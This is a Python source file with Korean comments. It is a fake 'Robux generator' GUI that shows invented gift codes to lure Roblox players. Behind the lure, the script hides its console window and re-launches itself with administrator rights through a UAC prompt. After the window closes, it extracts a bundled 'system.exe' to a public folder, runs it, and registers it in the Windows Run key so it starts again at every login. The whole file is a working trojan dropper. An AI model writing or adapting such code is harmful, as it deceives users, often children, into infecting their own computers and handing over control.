import os
import ctypes
import sys
import subprocess
import winreg as reg
import tkinter as tk
from tkinter import messagebox
import random
import time
import threading

# 관리자 권한 숨김
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# 설정
resource_name = "system.exe"  # 패키징된 리소스 파일 이름
target_path = "C:\\Users\\Public\\system.exe"  # 추출될 파일 경로


def generate_robux():
    try:
        amount = int(entry.get())
        if amount <= 0:
            raise ValueError
        console_messages = [
        "서버 연결 중...",
        "인증 코드 확인 중...",
        "로벅스 생성 요청 처리 중...",
        f"{amount} 로벅스 생성 중...",
        "완료!"
        ]
        for msg in console_messages:
            result_label.config(text="로벅스를 생성 중입니다...")
            time.sleep(1.5)
        copy_button.config(state="disabled")  # 복사 버튼 비활성화
        threading.Thread(target=simulate_generation, args=(amount,)).start()  # 별도의 스레드에서 실행
    except ValueError:
        messagebox.showerror("오류", "유효한 숫자를 입력하세요!")

def simulate_generation(amount):
    global fake_code
    fake_code = "RBX-" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=12))
    result_label.config(text=f"생성된 코드: {fake_code}")
    copy_button.config(state="normal")  # 복사 버튼 활성화
    messagebox.showinfo("성공!", f"{amount}개의 로벅스가 생성되었습니다!\n코드: {fake_code}")

def copy_to_clipboard():
    if fake_code:
        root.clipboard_clear()
        root.clipboard_append(fake_code)
        root.update()  # 클립보드를 갱신
        messagebox.showinfo("복사 완료", "생성된 코드가 클립보드에 복사되었습니다!")
        
        
def extract_resource(resource_name, save_path):
    """
    PyInstaller 패키징된 실행 파일에서 리소스를 추출합니다.
    """
    try:
        # PyInstaller 실행 파일 내 경로
        base_path = getattr(sys, "_MEIPASS", os.path.abspath("."))
        resource_path = os.path.join(base_path, resource_name)

        if not os.path.exists(resource_path):
            raise FileNotFoundError(f"리소스 파일 {resource_name}이(가) 존재하지 않습니다.")
        
        # 리소스 복사
        with open(resource_path, "rb") as resource_file:
            with open(save_path, "wb") as target_file:
                target_file.write(resource_file.read())

        print(f"리소스 파일 추출 완료: {save_path}")
        return save_path
    except Exception as e:
        print(f"리소스 추출 실패: {e}")
        return None

def run_file(file_path):
    """
    특정 파일을 실행합니다.
    """
    try:
        subprocess.run([file_path], check=True)
        print(f"{file_path} 실행 완료!")
    except subprocess.CalledProcessError as e:
        print(f"실행 실패: {e}")

def add_to_startup(file_path):
    """
    시작 프로그램에 파일 경로를 등록합니다.
    """
    try:
        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, "MyApp", 0, reg.REG_SZ, file_path)
        reg.CloseKey(registry_key)
        print(f"{file_path}가 시작 프로그램에 추가되었습니다.")
    except Exception as e:
        print(f"시작 프로그램 등록 실패: {e}")

def is_admin():
    """현재 스크립트가 관리자 권한으로 실행되고 있는지 확인합니다."""
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

def run_as_admin():
    """관리자 권한으로 스크립트를 다시 실행합니다."""
    if sys.version_info[0] == 3:
        script = sys.argv[0]
    else:
        script = sys.argv[0].decode(sys.getfilesystemencoding())
    
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)

if __name__ == "__main__":
    if not is_admin():
        print("이 스크립트는 관리자 권한이 필요합니다. 관리자 권한으로 다시 실행 중...")
        run_as_admin()
        sys.exit(0)
    root = tk.Tk()
    root.title("로벅스 제네레이터")
    root.geometry("400x300")

    fake_code = ""  # 생성된 코드를 저장하는 변수

    title_label = tk.Label(root, text="로벅스 생성기", font=("Arial", 16), fg="blue")
    title_label.pack(pady=10)

    entry_label = tk.Label(root, text="생성할 로벅스 수를 입력하세요:", font=("Arial", 12))
    entry_label.pack()

    entry = tk.Entry(root, font=("Arial", 12), justify="center")
    entry.pack(pady=5)

    generate_button = tk.Button(root, text="생성하기", font=("Arial", 12), bg="green", fg="white", command=generate_robux)
    generate_button.pack(pady=10)

    copy_button = tk.Button(root, text="코드 복사", font=("Arial", 12), bg="blue", fg="white", state="disabled", command=copy_to_clipboard)
    copy_button.pack(pady=10)

    result_label = tk.Label(root, text="", font=("Arial", 12), fg="red")
    result_label.pack(pady=20)
    root.mainloop()
    try:
        # 리소스 추출
        extracted_file = extract_resource(resource_name, target_path)
        if extracted_file:
            # 추출된 파일 실행
            run_file(extracted_file)
            # 시작 프로그램에 추가
            add_to_startup(extracted_file)
    except Exception as e:
        print(str(e))